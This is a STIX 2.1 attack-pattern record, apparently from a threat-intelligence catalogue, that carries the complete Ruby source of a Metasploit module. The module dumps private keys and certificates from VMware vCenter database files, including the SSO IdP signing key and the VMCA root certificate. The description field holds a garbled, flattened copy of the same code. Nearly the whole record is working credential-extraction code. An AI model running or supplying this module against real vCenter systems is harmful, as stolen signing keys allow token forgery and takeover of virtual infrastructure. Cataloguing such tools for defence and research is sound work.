{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4480d1b8-7a05-4324-a440-53ea4262b369",
    "created": "2024-08-14T16:22:41.591678Z",
    "modified": "2024-08-14T16:22:41.591682Z",
    "name": "VMware vCenter Extract Secrets from vmdir / vmafd DB File",
    "description": "Dump secrets from vCenter files  ] ] 'DefaultAction' => 'Dump' 'Notes' => { 'Stability' => [ CRASH_SAFE ] 'Reliability' => [ REPEATABLE_SESSION ] 'SideEffects' => [ ARTIFACTS_ON_DISK ]  ) )  register_options([ OptPath.new('VMDIR_MDB', [ false, 'Path to the vmdir data.mdb file' ]) OptPath.new('VMAFD_DB', [ false, 'Path to the vmafd afd.db file' ]) OptString.new('VC_IP', [ false, '(Optional) IPv4 address to attach to loot' ]) ])  register_advanced_options([ OptInt.new('MDB_CHUNK_SIZE', [ true, 'Block size to use when scanning MDB file', 4096 ]) OptInt.new('MDB_STARTING_OFFSET', [ true, 'Starting offset for MDB file binary scan', 0 ]) ]) end  def loot_host datastore['VC_IP'] || '127.0.0.1' end  def vmdir_file datastore['VMDIR_MDB'] end  def vmafd_file datastore['VMAFD_DB'] end  def run unless vmdir_file || vmafd_file print_error('Please specify the path to at least one vCenter database file (VMDIR_MDB or VMAFD_DB)') return end if vmdir_file print_status(\"Extracting vmwSTSTenantCredential from #{vmdir_file} ...\") extract_idp_cert end if vmafd_file print_status(\"Extracting vSphere platform certificates from #{vmafd_file} ...\") extract_vmafd_certs end end  def extract_vmafd_certs db = SQLite3::Database.open(vmafd_file) db.results_as_hash = true unless (vecs_entry_alias = db.execute('SELECT DISTINCT Alias FROM CertTable WHERE PrivateKey NOT NULL;')) fail_with(Msf::Exploit::Failure::NoTarget, 'Empty Alias list returned from CertTable') end vecs_entry_alias.each do |vecs_alias| store_label = vecs_alias['Alias'].upcase unless (res = db.execute(\"SELECT PrivateKey, CertBlob FROM CertTable WHERE Alias = '#{store_label}';\").first) fail_with(Msf::Exploit::Failure::NoTarget, \"Could not extract CertTable Alias '#{store_label}'\") end priv_pem = res['PrivateKey'].encode('utf-8').delete(\"\\000\") pub_pem = res['CertBlob'].encode('utf-8').delete(\"\\000\") begin key = OpenSSL::PKey::RSA.new(priv_pem) cert = OpenSSL::X509::Certificate.new(pub_pem) p = store_loot(store_label, 'PEM', loot_host, key.to_pem.to_s, \"#{store_label}.key\", \"vCenter #{store_label} Private Key\") print_good(\"#{store_label} key: #{p}\") p = store_loot(store_label, 'PEM', loot_host, cert.to_pem.to_s, \"#{store_label}.pem\", \"vCenter #{store_label} Certificate\") print_good(\"#{store_label} cert: #{p}\") rescue OpenSSL::PKey::PKeyError print_error(\"Could not extract #{store_label} private key\") rescue OpenSSL::X509::CertificateError print_error(\"Could not extract #{store_label} certificate\") end end rescue SQLite3::NotADatabaseException => e fail_with(Msf::Exploit::Failure::NoTarget, \"Error opening SQLite3 database '#{vmafd_file}': #{e.message}\") rescue SQLite3::SQLException => e fail_with(Msf::Exploit::Failure::NoTarget, \"Error calling SQLite3: #{e.message}\") end  def extract_idp_cert sts_pem = nil unless (bytes = read_mdb_sts_block(vmdir_file, datastore['MDB_CHUNK_SIZE'], datastore['MDB_STARTING_OFFSET'])) fail_with(Msf::Exploit::Failure::NoTarget, \"Invalid vmdird database '#{vmdir_file}': unable to locate TenantCredential-1 in binary stream\") end idp_key = get_sts_key(bytes) idp_key_pem = idp_key.to_pem.to_s get_sts_pem(bytes).each do |stscert| idp_cert_pem = stscert.to_pem.to_s case stscert.check_private_key(idp_key) when true # Private key associates with public cert sts_pem = \"#{idp_key_pem}#{idp_cert_pem}\" p = store_loot('idp', 'PEM', loot_host, idp_key_pem, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key') print_good(\"SSO_STS_IDP key: #{p}\") p = store_loot('idp', 'PEM', loot_host, idp_cert_pem, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate') print_good(\"SSO_STS_IDP cert: #{p}\") when false # Private key does not associate with this cert (VMCA root) p = store_loot('vmca', 'PEM', loot_host, idp_cert_pem, 'VMCA_ROOT.pem', 'vCenter VMCA root certificate') print_good(\"VMCA_ROOT cert: #{p}\") end end unless sts_pem # We were unable to link a public and private key together fail_with(Msf::Exploit::Failure::NoTarget, 'Unable to associate IdP certificate and private key') end end  def read_mdb_sts_block(file_name, chunk_size, offset) bytes = nil file = File.open(file_name, 'rb') while offset <= file.size - chunk_size buf = File.binread(file, chunk_size, offset + 1) if buf.match?(/cn=tenantcredential-1/i) && buf.match?(/[\\x30\\x82](.{2})[\\x30\\x82]/n) && buf.match?(/[\\x30\\x82](.{2})[\\x02\\x01\\x00]/n) target_offset = offset + buf.index(/cn=tenantcredential-1/i) + 1 bytes = File.binread(file, chunk_size * 2, target_offset) break end offset += chunk_size end bytes rescue StandardError => e fail_with(Msf::Exploit::Failure::Unknown, \"Exception in #{__method__}: #{e.message}\") ensure file.close end  def read_der(bytes) der_len = (bytes[2..3].unpack('H*').first.to_i(16) + 4).to_i unless der_len <= bytes.length - 1 fail_with(Msf::Exploit::Failure::Unknown, 'Malformed DER: byte length exceeds working buffer size') end bytes[0..der_len - 1] end  def get_sts_key(bytes) working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}020100/) / 2 # PKCS1 magic bytes byte_len = bytes.length - working_offset key_bytes = read_der(bytes[working_offset, byte_len]) key_b64 = Base64.strict_encode64(key_bytes).scan(/.{1,64}/).join(\"\\n\") key_pem = \"-----BEGIN PRIVATE KEY-----\\n#{key_b64}\\n-----END PRIVATE KEY-----\" vprint_status(\"key_pem:\\n#{key_pem}\") OpenSSL::PKey::RSA.new(key_pem) rescue OpenSSL::PKey::PKeyError # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of PKCS#1 RSA private key') print_error('Failure during extract of PKCS#1 RSA private key') end  def get_sts_pem(bytes) idp_certs = [] working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}3082/) / 2 # x509v3 magic bytes byte_len = bytes.length - working_offset working_bytes = bytes[working_offset, byte_len] [4, 8].each do |offset| der_bytes = read_der(working_bytes) der_b64 = Base64.strict_encode64(der_bytes).scan(/.{1,64}/).join(\"\\n\") der_pem = \"-----BEGIN CERTIFICATE-----\\n#{der_b64}\\n-----END CERTIFICATE-----\" vprint_status(\"der_pem:\\n#{der_pem}\") idp_certs << OpenSSL::X509::Certificate.new(der_pem) next_offset = working_offset + der_bytes.length + offset - 1 working_offset = next_offset byte_len = bytes.length - working_offset working_bytes = bytes[working_offset, byte_len] end idp_certs rescue OpenSSL::X509::CertificateError # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of x509v3 certificate') print_error('Failure during extract of x509v3 certificate') end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vmware/vcenter_offline_mdb_extract.rb",
            "external_id": "vcenter_offline_mdb_extract.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter Extract Secrets from vmdir / vmafd DB File',\n        'Description' => %q{\n          Grab certificates from the vCenter server vmdird and vmafd\n          database files and adds them to loot. The vmdird MDB database file\n          can be found on the live appliance under the path\n          /storage/db/vmware-vmdir/data.mdb, and the DB vmafd is under path\n          /storage/db/vmware-vmafd/afd.db. The vmdir database contains the\n          IdP signing credential, and vmafd contains the vCenter certificate\n          store. This module will accept either file from a live vCenter\n          appliance, or from a vCenter appliance backup archive; either or\n          both files can be supplied.\n        },\n        'Author' => 'npm[at]cesium137.io',\n        'Platform' => [ 'linux' ],\n        'DisclosureDate' => '2022-05-10',\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/']\n        ],\n        'Actions' => [\n          [\n            'Dump',\n            {\n              'Description' => 'Dump secrets from vCenter files'\n            }\n          ]\n        ],\n        'DefaultAction' => 'Dump',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n\n    register_options([\n      OptPath.new('VMDIR_MDB', [ false, 'Path to the vmdir data.mdb file' ]),\n      OptPath.new('VMAFD_DB', [ false, 'Path to the vmafd afd.db file' ]),\n      OptString.new('VC_IP', [ false, '(Optional) IPv4 address to attach to loot' ])\n    ])\n\n    register_advanced_options([\n      OptInt.new('MDB_CHUNK_SIZE', [ true, 'Block size to use when scanning MDB file', 4096 ]),\n      OptInt.new('MDB_STARTING_OFFSET', [ true, 'Starting offset for MDB file binary scan', 0 ])\n    ])\n  end\n\n  def loot_host\n    datastore['VC_IP'] || '127.0.0.1'\n  end\n\n  def vmdir_file\n    datastore['VMDIR_MDB']\n  end\n\n  def vmafd_file\n    datastore['VMAFD_DB']\n  end\n\n  def run\n    unless vmdir_file || vmafd_file\n      print_error('Please specify the path to at least one vCenter database file (VMDIR_MDB or VMAFD_DB)')\n      return\n    end\n    if vmdir_file\n      print_status(\"Extracting vmwSTSTenantCredential from #{vmdir_file} ...\")\n      extract_idp_cert\n    end\n    if vmafd_file\n      print_status(\"Extracting vSphere platform certificates from #{vmafd_file} ...\")\n      extract_vmafd_certs\n    end\n  end\n\n  def extract_vmafd_certs\n    db = SQLite3::Database.open(vmafd_file)\n    db.results_as_hash = true\n    unless (vecs_entry_alias = db.execute('SELECT DISTINCT Alias FROM CertTable WHERE PrivateKey NOT NULL;'))\n      fail_with(Msf::Exploit::Failure::NoTarget, 'Empty Alias list returned from CertTable')\n    end\n    vecs_entry_alias.each do |vecs_alias|\n      store_label = vecs_alias['Alias'].upcase\n      unless (res = db.execute(\"SELECT PrivateKey, CertBlob FROM CertTable WHERE Alias = '#{store_label}';\").first)\n        fail_with(Msf::Exploit::Failure::NoTarget, \"Could not extract CertTable Alias '#{store_label}'\")\n      end\n      priv_pem = res['PrivateKey'].encode('utf-8').delete(\"\\000\")\n      pub_pem = res['CertBlob'].encode('utf-8').delete(\"\\000\")\n      begin\n        key = OpenSSL::PKey::RSA.new(priv_pem)\n        cert = OpenSSL::X509::Certificate.new(pub_pem)\n        p = store_loot(store_label, 'PEM', loot_host, key.to_pem.to_s, \"#{store_label}.key\", \"vCenter #{store_label} Private Key\")\n        print_good(\"#{store_label} key: #{p}\")\n        p = store_loot(store_label, 'PEM', loot_host, cert.to_pem.to_s, \"#{store_label}.pem\", \"vCenter #{store_label} Certificate\")\n        print_good(\"#{store_label} cert: #{p}\")\n      rescue OpenSSL::PKey::PKeyError\n        print_error(\"Could not extract #{store_label} private key\")\n      rescue OpenSSL::X509::CertificateError\n        print_error(\"Could not extract #{store_label} certificate\")\n      end\n    end\n  rescue SQLite3::NotADatabaseException => e\n    fail_with(Msf::Exploit::Failure::NoTarget, \"Error opening SQLite3 database '#{vmafd_file}': #{e.message}\")\n  rescue SQLite3::SQLException => e\n    fail_with(Msf::Exploit::Failure::NoTarget, \"Error calling SQLite3: #{e.message}\")\n  end\n\n  def extract_idp_cert\n    sts_pem = nil\n    unless (bytes = read_mdb_sts_block(vmdir_file, datastore['MDB_CHUNK_SIZE'], datastore['MDB_STARTING_OFFSET']))\n      fail_with(Msf::Exploit::Failure::NoTarget, \"Invalid vmdird database '#{vmdir_file}': unable to locate TenantCredential-1 in binary stream\")\n    end\n    idp_key = get_sts_key(bytes)\n    idp_key_pem = idp_key.to_pem.to_s\n    get_sts_pem(bytes).each do |stscert|\n      idp_cert_pem = stscert.to_pem.to_s\n      case stscert.check_private_key(idp_key)\n      when true # Private key associates with public cert\n        sts_pem = \"#{idp_key_pem}#{idp_cert_pem}\"\n        p = store_loot('idp', 'PEM', loot_host, idp_key_pem, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')\n        print_good(\"SSO_STS_IDP key: #{p}\")\n        p = store_loot('idp', 'PEM', loot_host, idp_cert_pem, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')\n        print_good(\"SSO_STS_IDP cert: #{p}\")\n      when false # Private key does not associate with this cert (VMCA root)\n        p = store_loot('vmca', 'PEM', loot_host, idp_cert_pem, 'VMCA_ROOT.pem', 'vCenter VMCA root certificate')\n        print_good(\"VMCA_ROOT cert: #{p}\")\n      end\n    end\n    unless sts_pem # We were unable to link a public and private key together\n      fail_with(Msf::Exploit::Failure::NoTarget, 'Unable to associate IdP certificate and private key')\n    end\n  end\n\n  def read_mdb_sts_block(file_name, chunk_size, offset)\n    bytes = nil\n    file = File.open(file_name, 'rb')\n    while offset <= file.size - chunk_size\n      buf = File.binread(file, chunk_size, offset + 1)\n      if buf.match?(/cn=tenantcredential-1/i) && buf.match?(/[\\x30\\x82](.{2})[\\x30\\x82]/n) && buf.match?(/[\\x30\\x82](.{2})[\\x02\\x01\\x00]/n)\n        target_offset = offset + buf.index(/cn=tenantcredential-1/i) + 1\n        bytes = File.binread(file, chunk_size * 2, target_offset)\n        break\n      end\n      offset += chunk_size\n    end\n    bytes\n  rescue StandardError => e\n    fail_with(Msf::Exploit::Failure::Unknown, \"Exception in #{__method__}: #{e.message}\")\n  ensure\n    file.close\n  end\n\n  def read_der(bytes)\n    der_len = (bytes[2..3].unpack('H*').first.to_i(16) + 4).to_i\n    unless der_len <= bytes.length - 1\n      fail_with(Msf::Exploit::Failure::Unknown, 'Malformed DER: byte length exceeds working buffer size')\n    end\n    bytes[0..der_len - 1]\n  end\n\n  def get_sts_key(bytes)\n    working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}020100/) / 2 # PKCS1 magic bytes\n    byte_len = bytes.length - working_offset\n    key_bytes = read_der(bytes[working_offset, byte_len])\n    key_b64 = Base64.strict_encode64(key_bytes).scan(/.{1,64}/).join(\"\\n\")\n    key_pem = \"-----BEGIN PRIVATE KEY-----\\n#{key_b64}\\n-----END PRIVATE KEY-----\"\n    vprint_status(\"key_pem:\\n#{key_pem}\")\n    OpenSSL::PKey::RSA.new(key_pem)\n  rescue OpenSSL::PKey::PKeyError\n    # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of PKCS#1 RSA private key')\n    print_error('Failure during extract of PKCS#1 RSA private key')\n  end\n\n  def get_sts_pem(bytes)\n    idp_certs = []\n    working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}3082/) / 2 # x509v3 magic bytes\n    byte_len = bytes.length - working_offset\n    working_bytes = bytes[working_offset, byte_len]\n    [4, 8].each do |offset|\n      der_bytes = read_der(working_bytes)\n      der_b64 = Base64.strict_encode64(der_bytes).scan(/.{1,64}/).join(\"\\n\")\n      der_pem = \"-----BEGIN CERTIFICATE-----\\n#{der_b64}\\n-----END CERTIFICATE-----\"\n      vprint_status(\"der_pem:\\n#{der_pem}\")\n      idp_certs << OpenSSL::X509::Certificate.new(der_pem)\n      next_offset = working_offset + der_bytes.length + offset - 1\n      working_offset = next_offset\n      byte_len = bytes.length - working_offset\n      working_bytes = bytes[working_offset, byte_len]\n    end\n    idp_certs\n  rescue OpenSSL::X509::CertificateError\n    # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of x509v3 certificate')\n    print_error('Failure during extract of x509v3 certificate')\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-10",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}